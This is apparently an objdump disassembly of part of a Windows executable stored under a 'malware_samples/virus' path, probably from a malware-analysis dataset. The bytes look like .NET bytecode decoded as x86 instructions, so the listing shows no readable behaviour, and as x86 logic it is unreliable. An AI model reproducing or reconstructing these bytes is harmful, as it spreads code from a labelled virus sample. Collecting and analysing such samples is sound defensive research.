
malware_samples/virus/d66a9114c1d73bebbeaf57ba3267d847a29f38d33a87b4cd83f6b0ccae0ccb67.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	90                   	nop
  402001:	c7 00 00 00 00 00    	movl   $0x0,(%eax)
  402007:	00 48 00             	add    %cl,0x0(%eax)
  40200a:	00 00                	add    %al,(%eax)
  40200c:	02 00                	add    (%eax),%al
  40200e:	05 00 f4 59 00       	add    $0x59f400,%eax
  402013:	00 60 6d             	add    %ah,0x6d(%eax)
  402016:	00 00                	add    %al,(%eax)
  402018:	03 00                	add    (%eax),%eax
  40201a:	00 00                	add    %al,(%eax)
  40201c:	01 00                	add    %eax,(%eax)
  40201e:	00 06                	add    %al,(%esi)
	...
  402050:	bf eb 1e 56 fb       	mov    $0xfb561eeb,%edi
  402055:	cd 97                	int    $0x97
  402057:	3b b2 19 02 24 30    	cmp    0x30240219(%edx),%esi
  40205d:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40205e:	78 43                	js     0x4020a3
  402060:	00 3d 56 44 d2 1e    	add    %bh,0x1ed24456
  402066:	62 b9 d4 f1 80 e7    	bound  %edi,-0x187f0e2c(%ecx)
  40206c:	e6 c3                	out    %al,$0xc3
  40206e:	39 41 2e             	cmp    %eax,0x2e(%ecx)
  402071:	00 2f                	add    %ch,(%edi)
  402073:	00 5c 00 00          	add    %bl,0x0(%eax,%eax,1)
  402077:	00 1e                	add    %bl,(%esi)
  402079:	02 28                	add    (%eax),%ch
  40207b:	18 00                	sbb    %al,(%eax)
  40207d:	00 0a                	add    %cl,(%edx)
  40207f:	2a 1a                	sub    (%edx),%bl
  402081:	7e 13                	jle    0x402096
  402083:	00 00                	add    %al,(%eax)
  402085:	04 2a                	add    $0x2a,%al
  402087:	1e                   	push   %ds
  402088:	02 80 13 00 00 04    	add    0x4000013(%eax),%al
  40208e:	2a 1a                	sub    (%edx),%bl
  402090:	7e 14                	jle    0x4020a6
  402092:	00 00                	add    %al,(%eax)
  402094:	04 2a                	add    $0x2a,%al
  402096:	1e                   	push   %ds
  402097:	02 80 14 00 00 04    	add    0x4000014(%eax),%al
  40209d:	2a 1a                	sub    (%edx),%bl
  40209f:	7e 15                	jle    0x4020b6
  4020a1:	00 00                	add    %al,(%eax)
  4020a3:	04 2a                	add    $0x2a,%al
  4020a5:	1e                   	push   %ds
  4020a6:	02 80 15 00 00 04    	add    0x4000015(%eax),%al
  4020ac:	2a 1a                	sub    (%edx),%bl
  4020ae:	7e 16                	jle    0x4020c6
  4020b0:	00 00                	add    %al,(%eax)
  4020b2:	04 2a                	add    $0x2a,%al
  4020b4:	1e                   	push   %ds
  4020b5:	02 80 16 00 00 04    	add    0x4000016(%eax),%al
  4020bb:	2a 1a                	sub    (%edx),%bl
  4020bd:	7e 17                	jle    0x4020d6
  4020bf:	00 00                	add    %al,(%eax)
  4020c1:	04 2a                	add    $0x2a,%al
  4020c3:	1e                   	push   %ds
  4020c4:	02 80 17 00 00 04    	add    0x4000017(%eax),%al
  4020ca:	2a 1a                	sub    (%edx),%bl
  4020cc:	7e 18                	jle    0x4020e6
  4020ce:	00 00                	add    %al,(%eax)
  4020d0:	04 2a                	add    $0x2a,%al
  4020d2:	1e                   	push   %ds
  4020d3:	02 80 18 00 00 04    	add    0x4000018(%eax),%al
  4020d9:	2a 1a                	sub    (%edx),%bl
  4020db:	7e 19                	jle    0x4020f6
  4020dd:	00 00                	add    %al,(%eax)
  4020df:	04 2a                	add    $0x2a,%al
  4020e1:	1e                   	push   %ds
  4020e2:	02 80 19 00 00 04    	add    0x4000019(%eax),%al
  4020e8:	2a 1a                	sub    (%edx),%bl
  4020ea:	7e 1a                	jle    0x402106
  4020ec:	00 00                	add    %al,(%eax)
  4020ee:	04 2a                	add    $0x2a,%al
  4020f0:	1a 7e 1b             	sbb    0x1b(%esi),%bh
  4020f3:	00 00                	add    %al,(%eax)
  4020f5:	04 2a                	add    $0x2a,%al
  4020f7:	1e                   	push   %ds
  4020f8:	02 80 1b 00 00 04    	add    0x400001b(%eax),%al
  4020fe:	2a 1a                	sub    (%edx),%bl
  402100:	7e 1c                	jle    0x40211e
  402102:	00 00                	add    %al,(%eax)
  402104:	04 2a                	add    $0x2a,%al
  402106:	1e                   	push   %ds
  402107:	02 80 1c 00 00 04    	add    0x400001c(%eax),%al
  40210d:	2a 1a                	sub    (%edx),%bl
  40210f:	7e 1d                	jle    0x40212e
  402111:	00 00                	add    %al,(%eax)
  402113:	04 2a                	add    $0x2a,%al
  402115:	1e                   	push   %ds
  402116:	02 80 1d 00 00 04    	add    0x400001d(%eax),%al
  40211c:	2a 2a                	sub    (%edx),%ch
  40211e:	02 28                	add    (%eax),%ch
  402120:	3e 00 00             	add    %al,%ds:(%eax)
  402123:	0a 16                	or     (%esi),%dl
  402125:	fe 03                	incb   (%ebx)
  402127:	2a 32                	sub    (%edx),%dh
  402129:	7e 0b                	jle    0x402136
  40212b:	00 00                	add    %al,(%eax)
  40212d:	04 03                	add    $0x3,%al
  40212f:	6f                   	outsl  %ds:(%esi),(%dx)
  402130:	3f                   	aas
  402131:	00 00                	add    %al,(%eax)
  402133:	0a 2a                	or     (%edx),%ch
  402135:	2e 73 18             	jae,pn 0x402150
  402138:	00 00                	add    %al,(%eax)
  40213a:	0a 80 1a 00 00 04    	or     0x400001a(%eax),%al
  402140:	2a e6                	sub    %dh,%ah
  402142:	28 29                	sub    %ch,(%ecx)
  402144:	00 00                	add    %al,(%eax)
  402146:	06                   	push   %es
  402147:	3a 28                	cmp    (%eax),%ch
  402149:	00 00                	add    %al,(%eax)
  40214b:	00 28                	add    %ch,(%eax)
  40214d:	2a 00                	sub    (%eax),%al
  40214f:	00 06                	add    %al,(%esi)
  402151:	3a 1e                	cmp    (%esi),%bl
  402153:	00 00                	add    %al,(%eax)
  402155:	00 28                	add    %ch,(%eax)
  402157:	2b 00                	sub    (%eax),%eax
  402159:	00 06                	add    %al,(%esi)
  40215b:	3a 14 00             	cmp    (%eax,%eax,1),%dl
  40215e:	00 00                	add    %al,(%eax)
  402160:	28 27                	sub    %ah,(%edi)
  402162:	00 00                	add    %al,(%eax)
  402164:	06                   	push   %es
  402165:	3a 0a                	cmp    (%edx),%cl
  402167:	00 00                	add    %al,(%eax)
  402169:	00 28                	add    %ch,(%eax)
  40216b:	28 00                	sub    %al,(%eax)
  40216d:	00 06                	add    %al,(%esi)
  40216f:	39 06                	cmp    %eax,(%esi)
  402171:	00 00                	add    %al,(%eax)
  402173:	00 14 28             	add    %dl,(%eax,%ebp,1)
  402176:	76 00                	jbe    0x402178
  402178:	00 0a                	add    %cl,(%edx)
  40217a:	2a 56 28             	sub    0x28(%esi),%dl
  40217d:	9c                   	pushf
  40217e:	00 00                	add    %al,(%eax)
  402180:	0a 73 9d             	or     -0x63(%ebx),%dh
  402183:	00 00                	add    %al,(%eax)
  402185:	0a 20                	or     (%eax),%ah
  402187:	20 02                	and    %al,(%edx)
  402189:	00 00                	add    %al,(%eax)
  40218b:	6f                   	outsl  %ds:(%esi),(%dx)
  40218c:	9e                   	sahf
  40218d:	00 00                	add    %al,(%eax)
  40218f:	0a 2a                	or     (%edx),%ch
  402191:	6e                   	outsb  %ds:(%esi),(%dx)
  402192:	7e 1e                	jle    0x4021b2
  402194:	00 00                	add    %al,(%eax)
  402196:	04 39                	add    $0x39,%al
  402198:	10 00                	adc    %al,(%eax)
  40219a:	00 00                	add    %al,(%eax)
  40219c:	7e 1e                	jle    0x4021bc
  40219e:	00 00                	add    %al,(%eax)
  4021a0:	04 6f                	add    $0x6f,%al
  4021a2:	ad                   	lods   %ds:(%esi),%eax
  4021a3:	00 00                	add    %al,(%eax)
  4021a5:	0a 14 80             	or     (%eax,%eax,4),%dl
  4021a8:	1e                   	push   %ds
  4021a9:	00 00                	add    %al,(%eax)
  4021ab:	04 2a                	add    $0x2a,%al
  4021ad:	7e 7e                	jle    0x40222d
  4021af:	0f 00 00             	sldt   (%eax)
  4021b2:	04 28                	add    $0x28,%al
  4021b4:	17                   	pop    %ss
  4021b5:	00 00                	add    %al,(%eax)
  4021b7:	0a 39                	or     (%ecx),%bh
  4021b9:	0f 00 00             	sldt   (%eax)
  4021bc:	00 28                	add    %ch,(%eax)
  4021be:	30 00                	xor    %al,(%eax)
  4021c0:	00 06                	add    %al,(%esi)
  4021c2:	39 05 00 00 00 28    	cmp    %eax,0x28000000
  4021c8:	40                   	inc    %eax
  4021c9:	00 00                	add    %al,(%eax)
  4021cb:	06                   	push   %es
  4021cc:	2a 56 72             	sub    0x72(%esi),%dl
  4021cf:	f8                   	clc
  4021d0:	25 00 70 7e 10       	and    $0x107e7000,%eax
  4021d5:	00 00                	add    %al,(%eax)
  4021d7:	04 28                	add    $0x28,%al
  4021d9:	6f                   	outsl  %ds:(%esi),(%dx)
  4021da:	00 00                	add    %al,(%eax)
  4021dc:	0a 80 23 00 00 04    	or     0x4000023(%eax),%al
  4021e2:	2a be 73 94 00 00    	sub    0x9473(%esi),%bh
  4021e8:	06                   	push   %es
  4021e9:	25 72 ac 21 00       	and    $0x21ac72,%eax
  4021ee:	70 6f                	jo     0x40225f
  4021f0:	7f 00                	jg     0x4021f2
  4021f2:	00 06                	add    %al,(%esi)
  4021f4:	72 a4                	jb     0x40219a
  4021f6:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  4021fa:	8c 00                	mov    %es,(%eax)
  4021fc:	00 06                	add    %al,(%esi)
  4021fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4021ff:	89 00                	mov    %eax,(%eax)
  402201:	00 06                	add    %al,(%esi)
  402203:	28 20                	sub    %ah,(%eax)
  402205:	00 00                	add    %al,(%eax)
  402207:	06                   	push   %es
  402208:	20 e8                	and    %ch,%al
  40220a:	03 00                	add    (%eax),%eax
  40220c:	00 28                	add    %ch,(%eax)
  40220e:	14 00                	adc    $0x0,%al
  402210:	00 0a                	add    %cl,(%edx)
  402212:	2a da                	sub    %dl,%bl
  402214:	73 94                	jae    0x4021aa
  402216:	00 00                	add    %al,(%eax)
  402218:	06                   	push   %es
  402219:	25 72 ac 21 00       	and    $0x21ac72,%eax
  40221e:	70 6f                	jo     0x40228f
  402220:	7f 00                	jg     0x402222
  402222:	00 06                	add    %al,(%esi)
  402224:	72 b6                	jb     0x4021dc
  402226:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  40222a:	8c 00                	mov    %es,(%eax)
  40222c:	00 06                	add    %al,(%esi)
  40222e:	25 72 b6 26 00       	and    $0x26b672,%eax
  402233:	70 6f                	jo     0x4022a4
  402235:	7f 00                	jg     0x402237
  402237:	00 06                	add    %al,(%esi)
  402239:	02 6f 8c             	add    -0x74(%edi),%ch
  40223c:	00 00                	add    %al,(%eax)
  40223e:	06                   	push   %es
  40223f:	6f                   	outsl  %ds:(%esi),(%dx)
  402240:	89 00                	mov    %eax,(%eax)
  402242:	00 06                	add    %al,(%esi)
  402244:	28 20                	sub    %ah,(%eax)
  402246:	00 00                	add    %al,(%eax)
  402248:	06                   	push   %es
  402249:	2a 2e                	sub    (%esi),%ch
  40224b:	73 c9                	jae    0x402216
  40224d:	00 00                	add    %al,(%eax)
  40224f:	0a 80 24 00 00 04    	or     0x4000024(%eax),%al
  402255:	2a 5e 02             	sub    0x2(%esi),%bl
  402258:	28 19                	sub    %bl,(%ecx)
  40225a:	00 00                	add    %al,(%eax)
  40225c:	0a 03                	or     (%ebx),%al
  40225e:	6f                   	outsl  %ds:(%esi),(%dx)
  40225f:	1f                   	pop    %ds
  402260:	00 00                	add    %al,(%eax)
  402262:	0a 28                	or     (%eax),%ch
  402264:	4d                   	dec    %ebp
  402265:	00 00                	add    %al,(%eax)
  402267:	06                   	push   %es
  402268:	28 ce                	sub    %cl,%dh
  40226a:	00 00                	add    %al,(%eax)
  40226c:	0a 2a                	or     (%edx),%ch
  40226e:	5e                   	pop    %esi
  40226f:	28 19                	sub    %bl,(%ecx)
  402271:	00 00                	add    %al,(%eax)
  402273:	0a 02                	or     (%edx),%al
  402275:	03 28                	add    (%eax),%ebp
  402277:	1a 00                	sbb    (%eax),%al
  402279:	00 0a                	add    %cl,(%edx)
  40227b:	28 4f 00             	sub    %cl,0x0(%edi)
  40227e:	00 06                	add    %al,(%esi)
  402280:	6f                   	outsl  %ds:(%esi),(%dx)
  402281:	1b 00                	sbb    (%eax),%eax
  402283:	00 0a                	add    %cl,(%edx)
  402285:	2a 62 1f             	sub    0x1f(%edx),%ah
  402288:	20 8d 44 00 00 01    	and    %cl,0x1000044(%ebp)
  40228e:	25 d0 2d 00 00       	and    $0x2dd0,%eax
  402293:	04 28                	add    $0x28,%al
  402295:	e4 00                	in     $0x0,%al
  402297:	00 0a                	add    %cl,(%edx)
  402299:	80 2c 00 00          	subb   $0x0,(%eax,%eax,1)
  40229d:	04 2a                	add    $0x2a,%al
  40229f:	32 7e 2e             	xor    0x2e(%esi),%bh
  4022a2:	00 00                	add    %al,(%eax)
  4022a4:	04 02                	add    $0x2,%al
  4022a6:	6f                   	outsl  %ds:(%esi),(%dx)
  4022a7:	1f                   	pop    %ds
  4022a8:	00 00                	add    %al,(%eax)
  4022aa:	0a 2a                	or     (%edx),%ch
  4022ac:	32 7e 2e             	xor    0x2e(%esi),%bh
  4022af:	00 00                	add    %al,(%eax)
  4022b1:	04 02                	add    $0x2,%al
  4022b3:	6f                   	outsl  %ds:(%esi),(%dx)
  4022b4:	1b 00                	sbb    (%eax),%eax
  4022b6:	00 0a                	add    %cl,(%edx)
  4022b8:	2a 32                	sub    (%edx),%dh
  4022ba:	02 28                	add    (%eax),%ch
  4022bc:	e7 00                	out    %eax,$0x0
  4022be:	00 0a                	add    %cl,(%edx)
  4022c0:	28 58 00             	sub    %bl,0x0(%eax)
  4022c3:	00 06                	add    %al,(%esi)
  4022c5:	2a 8e 1a 8d 44 00    	sub    0x448d1a(%esi),%cl
  4022cb:	00 01                	add    %al,(%ecx)
  4022cd:	25 19 02 d2 9c       	and    $0x9cd20219,%eax
  4022d2:	25 18 02 1e 63       	and    $0x631e0218,%eax
  4022d7:	d2 9c 25 17 02 1f 10 	rcrb   %cl,0x101f0217(%ebp,%eiz,1)
  4022de:	63 d2                	arpl   %edx,%edx
  4022e0:	9c                   	pushf
  4022e1:	25 16 02 1f 18       	and    $0x181f0216,%eax
  4022e6:	63 d2                	arpl   %edx,%edx
  4022e8:	9c                   	pushf
  4022e9:	2a 4e 18             	sub    0x18(%esi),%cl
  4022ec:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4022f0:	01 25 17 02 d2 9c    	add    %esp,0x9cd20217
  4022f6:	25 16 02 1e 63       	and    $0x631e0216,%eax
  4022fb:	d2 9c 2a 32 02 28 e8 	rcrb   %cl,-0x17d7fdce(%edx,%ebp,1)
  402302:	00 00                	add    %al,(%eax)
  402304:	0a 28                	or     (%eax),%ch
  402306:	58                   	pop    %eax
  402307:	00 00                	add    %al,(%eax)
  402309:	06                   	push   %es
  40230a:	2a 2e                	sub    (%esi),%ch
  40230c:	73 e9                	jae    0x4022f7
  40230e:	00 00                	add    %al,(%eax)
  402310:	0a 80 2e 00 00 04    	or     0x400002e(%eax),%al
  402316:	2a 56 02             	sub    0x2(%esi),%dl
  402319:	15 7d 30 00 00       	adc    $0x307d,%eax
  40231e:	04 02                	add    $0x2,%al
  402320:	28 18                	sub    %bl,(%eax)
  402322:	00 00                	add    %al,(%eax)
  402324:	0a 02                	or     (%edx),%al
  402326:	03 7d 2f             	add    0x2f(%ebp),%edi
  402329:	00 00                	add    %al,(%eax)
  40232b:	04 2a                	add    $0x2a,%al
  40232d:	4a                   	dec    %edx
  40232e:	02 7b 2f             	add    0x2f(%ebx),%bh
  402331:	00 00                	add    %al,(%eax)
  402333:	04 02                	add    $0x2,%al
  402335:	7b 30                	jnp    0x402367
  402337:	00 00                	add    %al,(%eax)
  402339:	04 6f                	add    $0x6f,%al
  40233b:	ea 00 00 0a 2a 8a 02 	ljmp   $0x28a,$0x2a0a0000
  402342:	02 7b 30             	add    0x30(%ebx),%bh
  402345:	00 00                	add    %al,(%eax)
  402347:	04 17                	add    $0x17,%al
  402349:	58                   	pop    %eax
  40234a:	7d 30                	jge    0x40237c
  40234c:	00 00                	add    %al,(%eax)
  40234e:	04 02                	add    $0x2,%al
  402350:	7b 30                	jnp    0x402382
  402352:	00 00                	add    %al,(%eax)
  402354:	04 02                	add    $0x2,%al
  402356:	7b 2f                	jnp    0x402387
  402358:	00 00                	add    %al,(%eax)
  40235a:	04 6f                	add    $0x6f,%al
  40235c:	eb 00                	jmp    0x40235e
  40235e:	00 0a                	add    %cl,(%edx)
  402360:	fe 04 2a             	incb   (%edx,%ebp,1)
  402363:	22 02                	and    (%edx),%al
  402365:	15 7d 30 00 00       	adc    $0x307d,%eax
  40236a:	04 2a                	add    $0x2a,%al
  40236c:	56                   	push   %esi
  40236d:	02 28                	add    (%eax),%ch
  40236f:	18 00                	sbb    %al,(%eax)
  402371:	00 0a                	add    %cl,(%edx)
  402373:	02 03                	add    (%ebx),%al
  402375:	7d 32                	jge    0x4023a9
  402377:	00 00                	add    %al,(%eax)
  402379:	04 02                	add    $0x2,%al
  40237b:	04 7d                	add    $0x7d,%al
  40237d:	31 00                	xor    %eax,(%eax)
  40237f:	00 04 2a             	add    %al,(%edx,%ebp,1)
  402382:	32 02                	xor    (%edx),%al
  402384:	7b 32                	jnp    0x4023b8
  402386:	00 00                	add    %al,(%eax)
  402388:	04 6f                	add    $0x6f,%al
  40238a:	71 00                	jno    0x40238c
  40238c:	00 06                	add    %al,(%esi)
  40238e:	2a 4e 02             	sub    0x2(%esi),%cl
  402391:	7b 32                	jnp    0x4023c5
  402393:	00 00                	add    %al,(%eax)
  402395:	04 6f                	add    $0x6f,%al
  402397:	71 00                	jno    0x402399
  402399:	00 06                	add    %al,(%esi)
  40239b:	25 03 6f 8c 00       	and    $0x8c6f03,%eax
  4023a0:	00 06                	add    %al,(%esi)
  4023a2:	2a 4e 02             	sub    0x2(%esi),%cl
  4023a5:	7b 32                	jnp    0x4023d9
  4023a7:	00 00                	add    %al,(%eax)
  4023a9:	04 6f                	add    $0x6f,%al
  4023ab:	71 00                	jno    0x4023ad
  4023ad:	00 06                	add    %al,(%esi)
  4023af:	25 03 6f 74 00       	and    $0x746f03,%eax
  4023b4:	00 06                	add    %al,(%esi)
  4023b6:	2a 4e 02             	sub    0x2(%esi),%cl
  4023b9:	7b 32                	jnp    0x4023ed
  4023bb:	00 00                	add    %al,(%eax)
  4023bd:	04 6f                	add    $0x6f,%al
  4023bf:	71 00                	jno    0x4023c1
  4023c1:	00 06                	add    %al,(%esi)
  4023c3:	25 03 6f 85 00       	and    $0x856f03,%eax
  4023c8:	00 06                	add    %al,(%esi)
  4023ca:	2a 36                	sub    (%esi),%dh
  4023cc:	02 7b 31             	add    0x31(%ebx),%bh
  4023cf:	00 00                	add    %al,(%eax)
  4023d1:	04 03                	add    $0x3,%al
  4023d3:	6f                   	outsl  %ds:(%esi),(%dx)
  4023d4:	ea 00 00 0a 2a 32 02 	ljmp   $0x232,$0x2a0a0000
  4023db:	7b 31                	jnp    0x40240e
  4023dd:	00 00                	add    %al,(%eax)
  4023df:	04 6f                	add    $0x6f,%al
  4023e1:	eb 00                	jmp    0x4023e3
  4023e3:	00 0a                	add    %cl,(%edx)
  4023e5:	2a 66 02             	sub    0x2(%esi),%ah
  4023e8:	03 7d 33             	add    0x33(%ebp),%edi
  4023eb:	00 00                	add    %al,(%eax)
  4023ed:	04 02                	add    $0x2,%al
  4023ef:	02 7b 33             	add    0x33(%ebx),%bh
  4023f2:	00 00                	add    %al,(%eax)
  4023f4:	04 6f                	add    $0x6f,%al
  4023f6:	7d 00                	jge    0x4023f8
  4023f8:	00 0a                	add    %cl,(%edx)
  4023fa:	7d 34                	jge    0x402430
  4023fc:	00 00                	add    %al,(%eax)
  4023fe:	04 2a                	add    $0x2a,%al
  402400:	82 02 7b             	addb   $0x7b,(%edx)
  402403:	36 00 00             	add    %al,%ss:(%eax)
  402406:	04 18                	add    $0x18,%al
  402408:	3b 0d 00 00 00 02    	cmp    0x2000000,%ecx
  40240e:	28 6b 00             	sub    %ch,0x0(%ebx)
  402411:	00 06                	add    %al,(%esi)
  402413:	02 18                	add    (%eax),%bl
  402415:	7d 36                	jge    0x40244d
  402417:	00 00                	add    %al,(%eax)
  402419:	04 02                	add    $0x2,%al
  40241b:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  40241f:	06                   	push   %es
  402420:	2a 82 02 7b 36 00    	sub    0x367b02(%edx),%al
  402426:	00 04 19             	add    %al,(%ecx,%ebx,1)
  402429:	3b 0d 00 00 00 02    	cmp    0x2000000,%ecx
  40242f:	28 6b 00             	sub    %ch,0x0(%ebx)
  402432:	00 06                	add    %al,(%esi)
  402434:	02 19                	add    (%ecx),%bl
  402436:	7d 36                	jge    0x40246e
  402438:	00 00                	add    %al,(%eax)
  40243a:	04 02                	add    $0x2,%al
  40243c:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  402440:	06                   	push   %es
  402441:	2a 1e                	sub    (%esi),%bl
  402443:	02 28                	add    (%eax),%ch
  402445:	70 00                	jo     0x402447
  402447:	00 06                	add    %al,(%esi)
  402449:	2a 52 02             	sub    0x2(%edx),%dl
  40244c:	03 8c 68 00 00 01 7d 	add    0x7d010000(%eax,%ebp,2),%ecx
  402453:	35 00 00 04 02       	xor    $0x2040000,%eax
  402458:	1b 7d 36             	sbb    0x36(%ebp),%edi
  40245b:	00 00                	add    %al,(%eax)
  40245d:	04 2a                	add    $0x2a,%al
  40245f:	52                   	push   %edx
  402460:	02 03                	add    (%ebx),%al
  402462:	8c 95 00 00 01 7d    	mov    %ss,0x7d010000(%ebp)
  402468:	35 00 00 04 02       	xor    $0x2040000,%eax
  40246d:	1c 7d                	sbb    $0x7d,%al
  40246f:	36 00 00             	add    %al,%ss:(%eax)
  402472:	04 2a                	add    $0x2a,%al
  402474:	42                   	inc    %edx
  402475:	02 03                	add    (%ebx),%al
  402477:	7d 35                	jge    0x4024ae
  402479:	00 00                	add    %al,(%eax)
  40247b:	04 02                	add    $0x2,%al
  40247d:	1f                   	pop    %ds
  40247e:	0b 7d 36             	or     0x36(%ebp),%edi
  402481:	00 00                	add    %al,(%eax)
  402483:	04 2a                	add    $0x2a,%al
  402485:	52                   	push   %edx
  402486:	02 28                	add    (%eax),%ch
  402488:	70 00                	jo     0x40248a
  40248a:	00 06                	add    %al,(%esi)
  40248c:	25 03 7d 33 00       	and    $0x337d03,%eax
  402491:	00 04 04             	add    %al,(%esp,%eax,1)
  402494:	6f                   	outsl  %ds:(%esi),(%dx)
  402495:	81 00 00 06 2a 56    	addl   $0x562a0600,(%eax)
  40249b:	02 28                	add    (%eax),%ch
  40249d:	70 00                	jo     0x40249f
  40249f:	00 06                	add    %al,(%esi)
  4024a1:	25 03 7d 33 00       	and    $0x337d03,%eax
  4024a6:	00 04 04             	add    %al,(%esp,%eax,1)
  4024a9:	6a 6f                	push   $0x6f
  4024ab:	74 00                	je     0x4024ad
  4024ad:	00 06                	add    %al,(%esi)
  4024af:	2a 56 02             	sub    0x2(%esi),%dl
  4024b2:	28 6b 00             	sub    %ch,0x0(%ebx)
  4024b5:	00 06                	add    %al,(%esi)
  4024b7:	02 14 7d 35 00 00 04 	add    0x4000035(,%edi,2),%dl
  4024be:	02 17                	add    (%edi),%dl
  4024c0:	7d 36                	jge    0x4024f8
  4024c2:	00 00                	add    %al,(%eax)
  4024c4:	04 2a                	add    $0x2a,%al
  4024c6:	3e 02 03             	add    %ds:(%ebx),%al
  4024c9:	7d 35                	jge    0x402500
  4024cb:	00 00                	add    %al,(%eax)
  4024cd:	04 02                	add    $0x2,%al
  4024cf:	1a 7d 36             	sbb    0x36(%ebp),%bh
  4024d2:	00 00                	add    %al,(%eax)
  4024d4:	04 2a                	add    $0x2a,%al
  4024d6:	76 02                	jbe    0x4024da
  4024d8:	7b 35                	jnp    0x40250f
  4024da:	00 00                	add    %al,(%eax)
  4024dc:	04 3a                	add    $0x3a,%al
  4024de:	06                   	push   %es
  4024df:	00 00                	add    %al,(%eax)
  4024e1:	00 72 a6             	add    %dh,-0x5a(%edx)
  4024e4:	21 00                	and    %eax,(%eax)
  4024e6:	70 2a                	jo     0x402512
  4024e8:	02 7b 35             	add    0x35(%ebx),%bh
  4024eb:	00 00                	add    %al,(%eax)
  4024ed:	04 6f                	add    $0x6f,%al
  4024ef:	38 00                	cmp    %al,(%eax)
  4024f1:	00 0a                	add    %cl,(%edx)
  4024f3:	2a 52 02             	sub    0x2(%edx),%dl
  4024f6:	1d 7d 36 00 00       	sbb    $0x367d,%eax
  4024fb:	04 02                	add    $0x2,%al
  4024fd:	03 8c 6c 00 00 01 7d 	add    0x7d010000(%esp,%ebp,2),%ecx
  402504:	35 00 00 04 2a       	xor    $0x2a040000,%eax
  402509:	56                   	push   %esi
  40250a:	02 1f                	add    (%edi),%bl
  40250c:	09 7d 36             	or     %edi,0x36(%ebp)
  40250f:	00 00                	add    %al,(%eax)
  402511:	04 02                	add    $0x2,%al
  402513:	03 8c 97 00 00 01 7d 	add    0x7d010000(%edi,%edx,4),%ecx
  40251a:	35 00 00 04 2a       	xor    $0x2a040000,%eax
  40251f:	52                   	push   %edx
  402520:	02 1e                	add    (%esi),%bl
  402522:	7d 36                	jge    0x40255a
  402524:	00 00                	add    %al,(%eax)
  402526:	04 02                	add    $0x2,%al
  402528:	03 8c 96 00 00 01 7d 	add    0x7d010000(%esi,%edx,4),%ecx
  40252f:	35 00 00 04 2a       	xor    $0x2a040000,%eax
  402534:	1e                   	push   %ds
  402535:	02 28                	add    (%eax),%ch
  402537:	82 00 00             	addb   $0x0,(%eax)
  40253a:	06                   	push   %es
  40253b:	2a 22                	sub    (%edx),%ah
  40253d:	02 03                	add    (%ebx),%al
  40253f:	28 81 00 00 06 2a    	sub    %al,0x2a060000(%ecx)
  402545:	1e                   	push   %ds
  402546:	02 28                	add    (%eax),%ch
  402548:	77 00                	ja     0x40254a
  40254a:	00 06                	add    %al,(%esi)
  40254c:	2a 22                	sub    (%edx),%ah
  40254e:	02 03                	add    (%ebx),%al
  402550:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  402554:	06                   	push   %es
  402555:	2a 1e                	sub    (%esi),%bl
  402557:	02 28                	add    (%eax),%ch
  402559:	78 00                	js     0x40255b
  40255b:	00 06                	add    %al,(%esi)
  40255d:	2a 22                	sub    (%edx),%ah
  40255f:	02 03                	add    (%ebx),%al
  402561:	28 85 00 00 06 2a    	sub    %al,0x2a060000(%ebp)
  402567:	1e                   	push   %ds
  402568:	02 7b 36             	add    0x36(%ebx),%bh
  40256b:	00 00                	add    %al,(%eax)
  40256d:	04 2a                	add    $0x2a,%al
  40256f:	32 02                	xor    (%edx),%al
  402571:	7b 38                	jnp    0x4025ab
  402573:	00 00                	add    %al,(%eax)
  402575:	04 73                	add    $0x73,%al
  402577:	5f                   	pop    %edi
  402578:	00 00                	add    %al,(%eax)
  40257a:	06                   	push   %es
  40257b:	2a 4a 02             	sub    0x2(%edx),%cl
  40257e:	73 c9                	jae    0x402549
  402580:	00 00                	add    %al,(%eax)
  402582:	0a 7d 38             	or     0x38(%ebp),%bh
  402585:	00 00                	add    %al,(%eax)
  402587:	04 02                	add    $0x2,%al
  402589:	28 18                	sub    %bl,(%eax)
  40258b:	00 00                	add    %al,(%eax)
  40258d:	0a 2a                	or     (%edx),%ch
  40258f:	3a 02                	cmp    (%edx),%al
  402591:	6f                   	outsl  %ds:(%esi),(%dx)
  402592:	00 01                	add    %al,(%ecx)
  402594:	00 0a                	add    %cl,(%edx)
  402596:	d2 02                	rolb   %cl,(%edx)
  402598:	28 97 00 00 06 2a    	sub    %dl,0x2a060000(%edi)
  40259e:	32 02                	xor    (%edx),%al
  4025a0:	20 c0                	and    %al,%al
  4025a2:	00 00                	add    %al,(%eax)
  4025a4:	00 6f ee             	add    %ch,-0x12(%edi)
  4025a7:	00 00                	add    %al,(%eax)
  4025a9:	0a 2a                	or     (%edx),%ch
  4025ab:	6a 02                	push   $0x2
  4025ad:	20 cb                	and    %cl,%bl
  4025af:	00 00                	add    %al,(%eax)
  4025b1:	00 6f ee             	add    %ch,-0x12(%edi)
  4025b4:	00 00                	add    %al,(%eax)
  4025b6:	0a 02                	or     (%edx),%al
  4025b8:	03 28                	add    (%eax),%ebp
  4025ba:	5c                   	pop    %esp
  4025bb:	00 00                	add    %al,(%eax)
  4025bd:	06                   	push   %es
  4025be:	16                   	push   %ss
  4025bf:	1e                   	push   %ds
  4025c0:	6f                   	outsl  %ds:(%esi),(%dx)
  4025c1:	4c                   	dec    %esp
  4025c2:	00 00                	add    %al,(%eax)
  4025c4:	0a 2a                	or     (%edx),%ch
  4025c6:	7e 02                	jle    0x4025ca
  4025c8:	20 ca                	and    %cl,%dl
  4025ca:	00 00                	add    %al,(%eax)
  4025cc:	00 6f ee             	add    %ch,-0x12(%edi)
  4025cf:	00 00                	add    %al,(%eax)
  4025d1:	0a 02                	or     (%edx),%al
  4025d3:	03 28                	add    (%eax),%ebp
  4025d5:	fd                   	std
  4025d6:	00 00                	add    %al,(%eax)
  4025d8:	0a 28                	or     (%eax),%ch
  4025da:	58                   	pop    %eax
  4025db:	00 00                	add    %al,(%eax)
  4025dd:	06                   	push   %es
  4025de:	16                   	push   %ss
  4025df:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  4025e2:	00 00                	add    %al,(%eax)
  4025e4:	0a 2a                	or     (%edx),%ch
  4025e6:	7a 03                	jp     0x4025eb
  4025e8:	39 0c 00             	cmp    %ecx,(%eax,%eax,1)
